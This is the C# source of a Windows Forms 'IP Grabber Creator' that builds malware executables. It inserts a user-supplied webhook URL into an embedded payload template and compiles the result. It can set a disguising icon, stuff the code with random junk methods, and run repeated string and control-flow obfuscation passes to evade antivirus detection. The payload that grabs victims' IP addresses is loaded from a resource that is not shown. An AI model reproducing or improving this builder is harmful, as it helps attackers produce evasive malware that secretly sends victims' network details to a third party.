using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Drawing;
using System.Windows.Forms;
using System.Linq;
using System.Threading;
using System.Diagnostics;
using System.Net;
using System.IO;
using dnlib.DotNet;
namespace IP_Grabber
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        public static string BR()
        {
            return Environment.NewLine;
        }
        public string code { get; set; }
        void Compile()
        {
            CheckForIllegalCrossThreadCalls = false;
            Stopwatch stopwatch = new Stopwatch();
            stopwatch.Start();
            Text = "IP Grabber Creator | Compiling... | By Kye";
            //CSharpCodeProvider codeProvider = ;
            ICodeCompiler icc = new CSharpCodeProvider().CreateCompiler();
            string Output = nameSpace.Text + ".exe";
            CompilerParameters parameters = new CompilerParameters();
            //Make sure we generate an EXE, not a DLL
            parameters.GenerateExecutable = true;
            if (!obfbox.Checked)
            {
                //If not obfuscating
                parameters.OutputAssembly = Output;
            }
            else
            {
                //If obfuscating
                parameters.OutputAssembly = Output + "_243789.exe";
            }

            //Add the usual shit
            parameters.ReferencedAssemblies.Add("System.dll");
            parameters.ReferencedAssemblies.Add("mscorlib.dll");
            //parameters.CompilerOptions = "/optimize";
            if (textBox3.Text != "")
            {
                parameters.CompilerOptions = @"/win32icon:" + "\"" + textBox3.Text + "\"";
            }
            string namespace2 = nameSpace.Text.Replace(" ", "_");
            code = "using System;" + BR();
            code += "using System.Net;" + BR();
            code += "using System.IO;" + BR();
            code += "using System.Text;" + BR();
            code += "namespace " + namespace2 + BR();
            code += "{" + BR();
            code += "    class " + namespace2 + "_Class" + BR();
            code += "    {" + BR();

            if (junkBox.Checked)
            {
                for (int i = 0; i < 125; i++)
                {
                    code += "public static void " + RandomString(random.Next(5, 20)) + "() {}" + BR();
                    code += "public static string " + RandomString(random.Next(5, 20)) + "() { return null; }" + BR();
                    code += "public static string[] " + RandomString(random.Next(5, 20)) + " = {\"a\"};" + BR();
                    code += "private static string " + RandomString(random.Next(5, 20)) + "() { return null; }" + BR();
                    code += "public static int " + RandomString(random.Next(5, 20)) + "() { return 0; }" + BR();
                    code += "public static class " + RandomString(random.Next(5, 20)) + " {}" + BR();
                    code += "public static byte[] " + RandomString(random.Next(5, 20)) + " = {0};" + BR();
                    code += "public static long " + RandomString(random.Next(5, 20)) + " = 0;" + BR();
                    code += "public static long[] " + RandomString(random.Next(5, 20)) + " = {0};" + BR();
                    if (i == 80)
                    {
                        code += Properties.Resources.main.Replace("%webhook%", webhook.Text);
                    }
                }
            }
            else
            {
                code += Properties.Resources.main.Replace("%webhook%", webhook.Text);
            }
            code += "}" + BR();
            code += "}" + BR();
            textBox1.Text = code;
            CompilerResults results = icc.CompileAssemblyFromSource(parameters, textBox1.Text);

            if (results.Errors.Count > 0)
            {
                log.ForeColor = Color.Red;
                
                foreach (CompilerError CompErr in results.Errors)
                {
                    log.Text += "Line number " + CompErr.Line + ", Error Number: " + CompErr.ErrorNumber +", '" + CompErr.ErrorText + ";" + Environment.NewLine;
                }
                MessageBox.Show(results.Errors.Count.ToString() + " errors occured, check the log for more info", "IP Grabber Creator | Kye", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            else
            {
                log.ForeColor = Color.MediumBlue;
                stopwatch.Start();
                //Successful Compile
                
                
                if (obfbox.Checked)
                {
                    var module = ModuleDefMD.Load(Output + "_243789.exe");
                    ObfProtection.String(module);
                    ObfProtection.String(module);
                    ObfProtection.String(module);
                    ObfProtection.String(module);
                    ObfProtection.String(module);
                    ObfProtection.String(module);
                    ObfProtection.String(module);
                    ObfProtection.String(module);
                    ObfProtection.String(module);
                    ObfProtection.String(module);
                    ObfProtection.String(module);
                    ControlFlowObfuscation.Execute(module);
                    ControlFlowObfuscation.Execute(module);
                    ControlFlowObfuscation.Execute(module);
                    ControlFlowObfuscation.Execute(module);
                    ControlFlowObfuscation.Execute(module);
                        
                    module.Write(nameSpace.Text + ".exe");
                    module.Dispose();
                    File.Delete(Output + "_243789.exe");
                }
                log.Text = "Compiled " + Output + " in " + stopwatch.ElapsedMilliseconds + "ms";
                textBox1.Text = code;
                this.Text = "IP Grabber Creator | By Kye";
            }
        }

       
        private void button1_Click(object sender, EventArgs e)
        {

            string[] numbers = { "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", " ", "(", ")"};
            foreach (string x in numbers)
            {
                if (nameSpace.Text.StartsWith(x))
                {
                    MessageBox.Show("Namespace cannot start with a number or a space!", "IP Grabber Creator | By Kye", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    nameSpace.Focus();
                    return;
                }
            }
            try
            {
             new WebClient().DownloadString(webhook.Text);
                log.Text = "Compiling...";
                new Thread(Compile).Start();
            }
            catch
            {
                MessageBox.Show("That's not a valid webhook url!", "IP Grabber Creator | By Kye", MessageBoxButtons.OK, MessageBoxIcon.Error);
                webhook.Focus();
            }
        }


        public bool ViewedCode = false;
        private void button3_Click(object sender, EventArgs e)
        {
            switch (ViewedCode)
            {
                case true:
                    this.Size = new Size(751, 472);
                    ViewedCode = false;
                    break;

                case false:
                    this.Size = new Size(751, 770);
                    ViewedCode = true;
                    break;
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog a = new OpenFileDialog())
            {
                a.Filter = "ico file (*.ico)|*.ico";
                if (a.ShowDialog() == DialogResult.OK)
                {
                    textBox3.Text = a.FileName;
                    return;
                }
                if (a.ShowDialog() == DialogResult.Cancel)
                {
                    textBox3.Clear();
                    return;
                }
            }
        }
        private static Random random = new Random();
        public static string RandomString(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
            return new string(Enumerable.Repeat(chars, length).Select(s => s[random.Next(s.Length)]).ToArray());
        }
    }
}
